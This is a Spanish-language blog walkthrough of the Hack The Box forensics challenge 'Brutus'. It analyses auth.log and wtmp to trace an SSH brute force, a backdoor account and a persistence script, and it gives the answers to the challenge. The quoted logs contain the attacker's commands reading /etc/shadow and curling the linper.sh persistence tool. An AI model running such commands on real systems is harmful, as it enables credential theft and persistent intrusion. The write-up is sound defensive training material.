---
title: Brutus
description: En este Sherlock, te familiarizarás con los registros auth.log y wtmp de Unix. Exploraremos un escenario en el que un servidor Confluence fue atacado por fuerza bruta a través de su servicio SSH. Después de obtener acceso al servidor, el atacante realizó actividades adicionales, que podemos rastrear usando auth.log. Aunque auth.log se usa principalmente para el análisis por fuerza bruta, profundizaremos en todo el potencial de este artefacto en nuestra investigación, incluidos aspectos de escalada de privilegios, persistencia e incluso cierta visibilidad en la ejecución de comandos.
date: 2024-07-03
toc: true
pin: false
image:
 path: /assets/img/htb-writeup-brutus/brutus_logo.png
categories:
  - Hack The Box
  - Sherlocks
tags:
  - linux
  - hack the box
  - forensics
  - dfir

---
### Initial Analysis

```terminal
/home/kali/Documents/htb/sherlocks/brutus:-$ 7z x Brutus.zip -phacktheblue
Extracting archive: Brutus.zip
```

El archivo Zip contiene dos archivos. Un 'auth.log' y un 'wtmp'.

El archivo auth.log, en el contexto del inicio de sesión en un host, rastrea específicamente los eventos de autenticación. Las entradas en el archivo WTMP registran la creación y destrucción de terminales, o la asignación y liberación de terminales a los usuarios.

```terminal
/home/kali/Documents/htb/sherlocks/brutus:-$ utmpdump wtmp
Utmp dump of wtmp
[2] [00000] [~~  ] [reboot  ] [~           ] [6.2.0-1017-aws      ] [0.0.0.0        ] [2024-01-25T11:12:17,804944+00:00]
[5] [00601] [tyS0] [        ] [ttyS0       ] [                    ] [0.0.0.0        ] [2024-01-25T11:12:31,072401+00:00]
[6] [00601] [tyS0] [LOGIN   ] [ttyS0       ] [                    ] [0.0.0.0        ] [2024-01-25T11:12:31,072401+00:00]
[5] [00618] [tty1] [        ] [tty1        ] [                    ] [0.0.0.0        ] [2024-01-25T11:12:31,080342+00:00]
[6] [00618] [tty1] [LOGIN   ] [tty1        ] [                    ] [0.0.0.0        ] [2024-01-25T11:12:31,080342+00:00]
[1] [00053] [~~  ] [runlevel] [~           ] [6.2.0-1017-aws      ] [0.0.0.0        ] [2024-01-25T11:12:33,792454+00:00]
[7] [01284] [ts/0] [ubuntu  ] [pts/0       ] [203.101.190.9       ] [203.101.190.9  ] [2024-01-25T11:13:58,354674+00:00]
[8] [01284] [    ] [        ] [pts/0       ] [                    ] [0.0.0.0        ] [2024-01-25T11:15:12,956114+00:00]
[7] [01483] [ts/0] [root    ] [pts/0       ] [203.101.190.9       ] [203.101.190.9  ] [2024-01-25T11:15:40,806926+00:00]
[8] [01404] [    ] [        ] [pts/0       ] [                    ] [0.0.0.0        ] [2024-01-25T12:34:34,949753+00:00]
[7] [836798] [ts/0] [root    ] [pts/0       ] [203.101.190.9       ] [203.101.190.9  ] [2024-02-11T10:33:49,408334+00:00]
[5] [838568] [tyS0] [        ] [ttyS0       ] [                    ] [0.0.0.0        ] [2024-02-11T10:39:02,172417+00:00]
[6] [838568] [tyS0] [LOGIN   ] [ttyS0       ] [                    ] [0.0.0.0        ] [2024-02-11T10:39:02,172417+00:00]
[7] [838962] [ts/1] [root    ] [pts/1       ] [203.101.190.9       ] [203.101.190.9  ] [2024-02-11T10:41:11,700107+00:00]
[8] [838896] [    ] [        ] [pts/1       ] [                    ] [0.0.0.0        ] [2024-02-11T10:41:46,272984+00:00]
[7] [842171] [ts/1] [root    ] [pts/1       ] [203.101.190.9       ] [203.101.190.9  ] [2024-02-11T10:54:27,775434+00:00]
[8] [842073] [    ] [        ] [pts/1       ] [                    ] [0.0.0.0        ] [2024-02-11T11:08:04,769514+00:00]
[8] [836694] [    ] [        ] [pts/0       ] [                    ] [0.0.0.0        ] [2024-02-11T11:08:04,769963+00:00]
[1] [00000] [~~  ] [shutdown] [~           ] [6.2.0-1017-aws      ] [0.0.0.0        ] [2024-02-11T11:09:18,000731+00:00]
[2] [00000] [~~  ] [reboot  ] [~           ] [6.2.0-1018-aws      ] [0.0.0.0        ] [2024-03-06T06:17:15,744575+00:00]
[5] [00464] [tyS0] [        ] [ttyS0       ] [                    ] [0.0.0.0        ] [2024-03-06T06:17:27,354378+00:00]
[6] [00464] [tyS0] [LOGIN   ] [ttyS0       ] [                    ] [0.0.0.0        ] [2024-03-06T06:17:27,354378+00:00]
[5] [00505] [tty1] [        ] [tty1        ] [                    ] [0.0.0.0        ] [2024-03-06T06:17:27,469940+00:00]
[6] [00505] [tty1] [LOGIN   ] [tty1        ] [                    ] [0.0.0.0        ] [2024-03-06T06:17:27,469940+00:00]
[1] [00053] [~~  ] [runlevel] [~           ] [6.2.0-1018-aws      ] [0.0.0.0        ] [2024-03-06T06:17:29,538024+00:00]
[7] [01583] [ts/0] [root    ] [pts/0       ] [203.101.190.9       ] [203.101.190.9  ] [2024-03-06T06:19:55,151913+00:00]
[7] [02549] [ts/1] [root    ] [pts/1       ] [65.2.161.68         ] [65.2.161.68    ] [2024-03-06T06:32:45,387923+00:00]
[8] [02491] [    ] [        ] [pts/1       ] [                    ] [0.0.0.0        ] [2024-03-06T06:37:24,590579+00:00]
[7] [02667] [ts/1] [cyberjunkie] [pts/1       ] [65.2.161.68         ] [65.2.161.68    ] [2024-03-06T06:37:35,475575+00:00]
```
```terminal
/home/kali/Documents/htb/sherlocks/brutus:-$ cat auth.log
```
![](assets/img/htb-writeup-brutus/brutus1.png)

---
### Q1. Analyzing the auth.log, can you identify the IP address used by the attacker to carry out a brute force attack?

El archivo 'auth.log' registra eventos relacionados con accesos, autenticaciones y fallos en el sistema.

Analizo la frecuencia de eventos registrados para determinar si hay actividad sospechosa.

```terminal
/home/kali/Documents/htb/sherlocks/brutus:-$ cat auth.log | cut -d' ' -f 6 | cut -d' ' -f 1 | sort | uniq -c | sort -nr
257 sshd
104 CRON
008 systemd-logind
006 sudo
003 groupadd
002 usermod
002 systemd
001 useradd
001 passwd
001 chfn
```

Los eventos relacionados con el servicio 'sshd' son los más frecuentes (257), lo que sugiere intentos recurrentes de inicio de sesión SSH

Al buscar entradas relacionadas con 'sshd', identifico múltiples intentos fallidos de autenticación seguidos de un intento exitoso desde la misma dirección IP

```terminal
/home/kali/Documents/htb/sherlocks/brutus:-$ cat auth.log | grep sshd | less
Mar  6 06:19:52 ip-172-31-35-28 sshd[1465]: AuthorizedKeysCommand /usr/share/ec2-instance-connect/eic_run_authorized_keys root SHA256:4vycLsDMzI+hyb9OP3wd18zIpyTqJmRq/QIZaLNrg8A failed, status 22
Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: Accepted password for root from 203.101.190.9 port 42825 ssh2
Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
...
Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Invalid user admin from 65.2.161.68 port 46380
Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Received disconnect from 65.2.161.68 port 46380:11: Bye Bye [preauth]
Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Disconnected from invalid user admin 65.2.161.68 port 46380 [preauth]
...
Mar  6 06:31:33 ip-172-31-35-28 sshd[2327]: Failed password for invalid user admin from 65.2.161.68 port 46392 ssh2
...
Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2
Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: pam_unix(sshd:session): session 	opened for user root(uid=0) by (uid=0)
...
Mar  6 06:31:42 ip-172-31-35-28 sshd[2423]: Failed password for backup from 65.2.161.68 port 34834 ssh2
Mar  6 06:31:42 ip-172-31-35-28 sshd[2424]: Failed password for backup from 65.2.161.68 port 34856 ssh2
```

Puedo contar los intentos fallidos de contraseña en un período de tiempo específico.

```terminal
/home/kali/Documents/htb/sherlocks/brutus:-$ cat auth.log | grep sshd | grep 'Failed password' | grep '06:31:3[1-9]\|06:31:4[0-2]' | wc -l
48
```

Esto muestra que hubo 48 intentos fallidos en un intervalo corto, lo cual es característico de un ataque de fuerza bruta.

##### A1. 65.2.161.68

### Q2. The brute force attempts were successful, and the attacker gained access to an account on the server. What is the username of this account?

El mensaje 'Accepted password for root' confirma que el atacante logró autenticarse exitosamente en el servidor utilizando el nombre de usuario root.

```terminal
/home/kali/Documents/htb/sherlocks/brutus:-$ cat auth.log | grep sshd | less
```

![](assets/img/htb-writeup-brutus/brutus2.png)

Adicionalmente, el sistema abrió una sesión SSH para este usuario 'pam_unix(sshd:session): session opened for user root', lo que valida que el atacante obtuvo acceso con privilegios administrativos completos.

##### A2. root

### Q3. Can you identify the timestamp when the attacker manually logged in to the server to carry out their objectives?

Se observan tres inicios de sesión desde la IP del atacante.

```terminal
/home/kali/Documents/htb/sherlocks/brutus:-$ cat auth.log | grep Accepted
Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: Accepted password for root from 203.101.190.9 port 42825 ssh2
Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2
```

* 06:31:40: Representa el momento en que las credenciales de root fueron descubiertas mediante fuerza bruta.
* 06:32:44: Un acceso posterior 1 minuto y 4 segundos despues.

![](assets/img/htb-writeup-brutus/brutus3.png)

Según los registros en 'wtmp' el atacante inició una sesión manual desde la dirección IP 65.2.161.68.

```terminal
/home/kali/Documents/htb/sherlocks/brutus:-$ utmpdump wtmp | grep 65.2.161.68
[7] [02549] [ts/1] [root    ] [pts/1       ] [65.2.161.68         ] [65.2.161.68    ] [2024-03-06T06:32:45,387923+00:00]
[7] [02667] [ts/1] [cyberjunkie] [pts/1       ] [65.2.161.68         ] [65.2.161.68    ] [2024-03-06T06:37:35,475575+00:00]
```

Esto confirma que el atacante comenzó su sesión SSH a las 06:32:45

##### A3. 2024-03-06 06:32:45

### Q4. SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker’s session for the user account from Question 2?

El atacante inició sesión como root desde la dirección IP 65.2.161.68 a las 06:32:44, como se puede observar en los registros

```terminal
/home/kali/Documents/htb/sherlocks/brutus:-$ cat auth.log | grep 06:32:44
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
```

El registro generado por systemd-logind muestra que al inicio de sesión exitoso del atacante se le asignó la sesión 37. Esto confirma que el número de sesión relacionado con el acceso del atacante como root es 37.

##### A4. 37

### Q5. The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?

Después del inicio de sesión del atacante a las 06:32:44, encuentro evidencia de la creación de un nuevo usuario.

```terminal
/home/kali/Documents/htb/sherlocks/brutus:-$ cat auth.log | grep -v sshd | sed -n '/06:32:44/,$p'
```

![](assets/img/htb-writeup-brutus/brutus4.png)

El usuario cyberjunkie fue creado y asignado a un nuevo grupo con los siguientes detalles:
* UID: 1002
* GID: 1002
* Home: /home/cyberjunkie
* Shell: /bin/bash

Momentos después, el atacante añadió el usuario cyberjunkie al grupo sudo, otorgándole privilegios administrativos.

```terminal
/home/kali/Documents/htb/sherlocks/brutus:-$ cat auth.log | grep useradd
Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1

/home/kali/Documents/htb/sherlocks/brutus:-$ cat auth.log | grep usermod
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to group 'sudo'
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to shadow group 'sudo'
```

Estas acciones ocurrieron poco después del inicio de sesión del atacante, confirmando que fueron parte de su estrategia de persistencia en el sistema.

##### A5. cyberjunkie

### Q6. What is the mitre technique id used for persistence?

La técnica T1136 del MITRE ATT&CK se refiere a la creación de cuentas en el sistema como parte de la estrategia de persistencia de un atacante.

<https://attack.mitre.org/techniques/T1136/001/>

![](assets/img/htb-writeup-brutus/brutus5.png)

* T1136 - Create Account: Los atacantes crean cuentas para garantizar el acceso persistente al sistema, incluso si las credenciales originales o métodos de acceso son bloqueados.

* T1136.001 - Local Account Creation: Esta subtécnica se refiere específicamente a la creación de cuentas locales. El atacante crea una cuenta en el sistema, lo que le permite mantener el control incluso después de reinicios o cambios en las credenciales.

El atacante en este caso creó una cuenta local llamada 'cyberjunkie' para garantizar el acceso persistente al servidor comprometido, lo que encaja con la técnica T1136.001.

##### A6. T1136.001

### Q7. How long did the attacker’s first SSH session last based on the previously confirmed authentication time and session ending within the auth.log? (seconds)

La hora de inicio de la sesión se obtiene de los registros del archivo wtmp, donde el atacante se conecta a las 06:32:45.
La hora de finalización se obtiene del archivo auth.log, donde la desconexión ocurre a las 06:37:24.

Inicio: (32 × 60) + 45 = 1965 segundos.
Finalización: (37 × 60) + 24 = 2244 segundos.

La duración de la sesión se calcula restando el tiempo de inicio del tiempo de finalización en segundos.

```terminal
/home/kali/Documents/htb/sherlocks/brutus:-$ utmpdump wtmp | grep 65.2.161.68
[7] [02549] [ts/1] [root    ] [pts/1       ] [65.2.161.68         ] [65.2.161.68    ] [2024-03-06T06:32:45,387923+00:00]
[7] [02667] [ts/1] [cyberjunkie] [pts/1       ] [65.2.161.68         ] [65.2.161.68    ] [2024-03-06T06:37:35,475575+00:00]

/home/kali/Documents/htb/sherlocks/brutus:-$ cat auth.log | grep 53184
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Received disconnect from 65.2.161.68 port 53184:11: disconnected by user
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Disconnected from user root 65.2.161.68 port 53184

/home/kali/Documents/htb/sherlocks/brutus:-$ mate-calc -s ((37*60)+24)-((32*60)+45)
279
```

##### A7. 279 seconds

### Q8. The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?

A las 06:39:38, 'cyberjunkie' ejecutó un comando usando sudo para descargar un script desde una URL.

```terminal
/home/kali/Documents/htb/sherlocks/brutus:-$ cat auth.log | grep sudo           
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to group 'sudo'
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to shadow group 'sudo'
Mar  6 06:37:57 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
Mar  6 06:37:57 ip-172-31-35-28 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by cyberjunkie(uid=1002)
Mar  6 06:37:57 ip-172-31-35-28 sudo: pam_unix(sudo:session): session closed for user root
Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
Mar  6 06:39:38 ip-172-31-35-28 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by cyberjunkie(uid=1002)
Mar  6 06:39:39 ip-172-31-35-28 sudo: pam_unix(sudo:session): session closed for user root
```

Este comando descargó el script linper.sh desde una URL de GitHub usando 'curl'.

##### A8. /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
 
---
### Timeline

| Time (UTC) | Description                            | Reference |
| :--------- | :------------------------------------- | :-------: |
|	06:18:01   | First entry in auth.log. 	            | auth.log  |
|	06:31:33   | SSH brute force start 			            | auth.log  |
|	06:31:40   | root SSH login successful 	            | auth.log  |
|	06:31:42   | SSH brute force stop 		              | auth.log  |
|	06:32:44   | SSH login as root 			                | auth.log  |
|	06:32:45   | Terminal session starts as root        | wtmp      |
|	06:34:18   | cyberjunkie user and group created 	  | auth.log  |
|	06:35:15   | cyberjunkie added to sudo group        | auth.log  |
|	06:37:24   | root session disconnects 		          | auth.log  |
|	06:37:34   | SSH login as cyberjunkie 	            | auth.log  |
|	06:37:35   | Terminal session starts as cyberjunkie | wtmp      |
|	06:37:57   | cyberjunkie accesses /etc/shadow 	    | auth.log  |
|	06:39:38   | cyberjunkie downloads linper.sh 	      | auth.log  |
|	06:41:01   | Last entry in auth.log 		            | auth.log  |

> <https://labs.hackthebox.com/achievement/sherlock/1521382/631>
{: .prompt-tip}